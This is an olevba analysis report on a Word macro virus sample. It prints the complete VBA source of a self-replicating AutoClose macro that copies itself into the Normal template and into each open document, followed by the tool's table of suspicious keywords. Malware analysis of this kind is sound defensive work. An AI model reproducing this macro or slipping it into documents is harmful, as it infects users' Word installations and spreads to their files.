olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Minimal.ab-2c477e8b869d2a2b5b9f10952a7f15bcb9443ced
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Minimal.ab-2c477e8b869d2a2b5b9f10952a7f15bcb9443ced - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO a.bas 
in file: Virus.MSWord.Minimal.ab-2c477e8b869d2a2b5b9f10952a7f15bcb9443ced - OLE stream: 'Macros/VBA/a'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
b = "a"
Application.VBE.ActiveVBProject.VBComponents("a").Export (b)
NormalTemplate.VBProject.VBComponents.Import b
ActiveDocument.VBProject.VBComponents.Import b
ActiveDocument.SaveAs FileFormat:=1
End Sub
-------------------------------------------------------------------------------
VBA MACRO a1.bas 
in file: Virus.MSWord.Minimal.ab-2c477e8b869d2a2b5b9f10952a7f15bcb9443ced - OLE stream: 'Macros/VBA/a1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
b = "a"
Application.VBE.ActiveVBProject.VBComponents("a").Export (b)
NormalTemplate.VBProject.VBComponents.Import b
ActiveDocument.VBProject.VBComponents.Import b
ActiveDocument.SaveAs FileFormat:=1
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

